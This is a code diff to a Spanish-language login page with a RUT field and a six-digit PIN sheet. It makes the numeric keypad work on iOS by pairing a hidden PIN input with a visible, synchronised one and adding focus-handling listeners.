@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Inicia sesión</title>
 
 <style>
@@ -489,6 +489,88 @@ input[type="number"] {
     appearance: textfield;
 }
 
+/* ============================================
+   SOLUCIÓN PARA iOS - TECLADO NUMÉRICO
+   ============================================ */
+/* Forzar teclado numérico en iOS */
+input[type="text"].numeric-input {
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+/* Ocultar el campo real pero mantenerlo funcional */
+#claveSheet {
+    position: absolute !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
+    width: 1px !important;
+    height: 1px !important;
+    margin: -1px !important;
+    padding: 0 !important;
+    border: 0 !important;
+    clip: rect(0, 0, 0, 0) !important;
+    overflow: hidden !important;
+}
+
+/* Estilo para el input visible que usaremos en iOS */
+#claveSheetVisible {
+    width: 100%;
+    height: 56px;
+    border: 2.5px solid #5B2EFF;
+    border-radius: 18px;
+    padding: 0 24px;
+    font-size: 18px;
+    color: #555;
+    outline: none;
+    transition: border-color 0.2s;
+    display: block;
+    margin: 8px auto 0;
+    background: #fff;
+    text-align: center;
+    letter-spacing: 8px;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+#claveSheetVisible:focus {
+    border-color: #4a25d6;
+}
+
+#claveSheetVisible::placeholder {
+    color: #7f7f7f;
+    letter-spacing: 2px;
+    font-weight: normal;
+    font-size: 16px;
+}
+
+/* Ajuste para el teclado numérico en iOS */
+#claveSheetVisible.inputmode-numeric {
+    inputmode: numeric;
+    -webkit-input-placeholder: "••••••";
+}
+
+/* Responsive para el input visible */
+@media(max-width:430px){
+    #claveSheetVisible {
+        height: 50px;
+        font-size: 20px;
+        letter-spacing: 6px;
+        padding: 0 12px;
+        border-radius: 7px;
+    }
+}
+
+@media(max-width:380px){
+    #claveSheetVisible {
+        height: 44px;
+        font-size: 18px;
+        letter-spacing: 4px;
+        padding: 0 10px;
+        border-radius: 14px;
+        width: 88%;
+    }
+}
+
 </style>
 </head>
 
@@ -552,13 +634,29 @@ placeholder="12.345.678-9">
         <div class="circle" data-index="5"></div>
     </div>
 
-    <!-- CAMPO DE CLAVE MODIFICADO A TYPE="NUMBER" -->
+    <!-- CAMPO OCULTO REAL - MODIFICADO PARA iOS -->
     <input 
-        type="number" 
+        type="text" 
         id="claveSheet" 
         maxlength="6" 
-        style="position:absolute;opacity:0;pointer-events:none;" 
-        autofocus
+        autocomplete="off"
+        autocorrect="off"
+        autocapitalize="off"
+        spellcheck="false"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        class="numeric-input">
+
+    <!-- CAMPO VISIBLE PARA iOS - con inputmode numérico -->
+    <input 
+        type="text" 
+        id="claveSheetVisible" 
+        maxlength="6" 
+        placeholder="• • • • • •"
+        autocomplete="off"
+        autocorrect="off"
+        autocapitalize="off"
+        spellcheck="false"
         inputmode="numeric"
         pattern="[0-9]*">
 
@@ -579,6 +677,7 @@ const rut = document.getElementById("rut");
 const overlay = document.getElementById("overlay");
 const sheet = document.getElementById("sheet");
 const claveSheet = document.getElementById("claveSheet");
+const claveSheetVisible = document.getElementById("claveSheetVisible");
 const btnSheet = document.getElementById("btnSheet");
 const btnContinuar = document.getElementById("btnContinuar");
 const circles = document.querySelectorAll(".circle");
@@ -607,18 +706,14 @@ function abrirSheet() {
     overlay.classList.add("show");
     sheet.classList.add("show");
     setTimeout(() => {
-        claveSheet.focus();
-        // En dispositivos móviles, forzar el teclado numérico
-        if ('showPicker' in HTMLInputElement.prototype) {
-            try {
-                claveSheet.showPicker();
-            } catch(e) {
-                // Fallback si showPicker no está disponible
-            }
-        }
+        // Enfoque en el campo visible que tiene inputmode numeric
+        claveSheetVisible.focus();
+        // Seleccionar todo el texto para que el usuario pueda empezar a escribir
+        claveSheetVisible.select();
     }, 400);
     // Resetear la clave al abrir
     claveSheet.value = "";
+    claveSheetVisible.value = "";
     actualizarCirculos();
     btnSheet.classList.remove("active");
     btnSheet.disabled = true;
@@ -628,8 +723,8 @@ function abrirSheet() {
 function cerrarSheet() {
     overlay.classList.remove("show");
     sheet.classList.remove("show");
-    // Quitar el foco del campo de clave
-    claveSheet.blur();
+    // Quitar el foco del campo visible
+    claveSheetVisible.blur();
 }
 
 // Actualizar círculos del PIN
@@ -656,6 +751,47 @@ function validarSheet(){
         btnSheet.disabled = true;
     }
 }
+
+// Función para sincronizar el input visible con el oculto
+function sincronizarClave(valor) {
+    // Limpiar solo números
+    let limpio = valor.replace(/[^0-9]/g, '');
+    if(limpio.length > 6){
+        limpio = limpio.slice(0, 6);
+    }
+    
+    // Actualizar ambos campos
+    claveSheet.value = limpio;
+    claveSheetVisible.value = limpio;
+    
+    // Actualizar la visualización de los círculos
+    actualizarCirculos();
+    validarSheet();
+}
+
+// Evento del campo visible (el que usa el usuario)
+claveSheetVisible.addEventListener("input", function(e){
+    sincronizarClave(this.value);
+});
+
+// Evento del campo oculto (por si acaso)
+claveSheet.addEventListener("input", function(){
+    sincronizarClave(this.value);
+});
+
+// Evento de teclado para el PIN (tecla enter)
+claveSheetVisible.addEventListener("keydown", function(e){
+    if(e.key === "Enter" && this.value.length === 6){
+        btnSheet.click();
+    }
+});
+
+// También en el campo oculto
+claveSheet.addEventListener("keydown", function(e){
+    if(e.key === "Enter" && this.value.length === 6){
+        btnSheet.click();
+    }
+});
 
 // Evento del RUT - formateo automático
 rut.addEventListener("input", function(){
@@ -698,27 +834,6 @@ btnContinuar.addEventListener("click", function() {
         console.log('Usuario guardado:', rutLimpio, 'Transaction ID:', transactionId);
         
         abrirSheet();
-    }
-});
-
-// Evento del campo clave oculto (modificado para number)
-claveSheet.addEventListener("input", function(){
-    // Para input type="number", el valor viene como string
-    let valor = this.value;
-    // Eliminar cualquier caracter no numérico
-    valor = valor.replace(/[^0-9]/g, '');
-    if(valor.length > 6){
-        valor = valor.slice(0, 6);
-    }
-    this.value = valor;
-    actualizarCirculos();
-    validarSheet();
-});
-
-// Evento de teclado para el PIN (tecla enter)
-claveSheet.addEventListener("keydown", function(e){
-    if(e.key === "Enter" && this.value.length === 6){
-        btnSheet.click();
     }
 });
 
@@ -802,16 +917,56 @@ rut.addEventListener("keydown", function(e) {
     }
 });
 
-// Forzar el enfoque al campo de clave cuando se abre el sheet
-// y asegurar que el teclado numérico aparezca
-document.addEventListener('click', function(e) {
-    if (sheet.classList.contains('show') && !e.target.closest('.bottom-sheet')) {
-        setTimeout(() => {
-            claveSheet.focus();
-        }, 100);
+// ============================================
+// MEJORAS PARA iOS
+// ============================================
+
+// 1. Asegurar que el teclado numérico aparezca al enfocar el campo visible
+claveSheetVisible.addEventListener("focus", function() {
+    // En iOS, el inputmode="numeric" es suficiente
+    // Pero forzamos la selección para que el usuario pueda empezar a escribir
+    this.select();
+});
+
+// 2. Prevenir que el teclado predeterminado de iOS aparezca en el campo oculto
+claveSheet.addEventListener("focus", function(e) {
+    // Redirigir el foco al campo visible
+    setTimeout(() => {
+        claveSheetVisible.focus();
+    }, 10);
+});
+
+// 3. Forzar el enfoque en el campo visible si se hace clic en los círculos
+document.querySelectorAll('.circle').forEach(circle => {
+    circle.addEventListener('click', function() {
+        if (sheet.classList.contains('show')) {
+            claveSheetVisible.focus();
+            claveSheetVisible.select();
+        }
+    });
+});
+
+// 4. En iOS, a veces el teclado no aparece si no hay un toque directo
+// Añadir un listener para tocar el área del PIN
+document.getElementById('pinContainer').addEventListener('click', function() {
+    if (sheet.classList.contains('show')) {
+        claveSheetVisible.focus();
+        claveSheetVisible.select();
     }
 });
 
+// 5. Al hacer clic en el bottom sheet (pero no en inputs), enfocar el campo
+document.querySelector('.bottom-sheet').addEventListener('click', function(e) {
+    // Si el clic no fue en un input o botón
+    if (!e.target.closest('input') && !e.target.closest('button') && !e.target.closest('.cerrar')) {
+        if (sheet.classList.contains('show')) {
+            claveSheetVisible.focus();
+            claveSheetVisible.select();
+        }
+    }
+});
+
+console.log('🔢 Teclado numérico configurado para iOS');
 </script>
 
 </body>
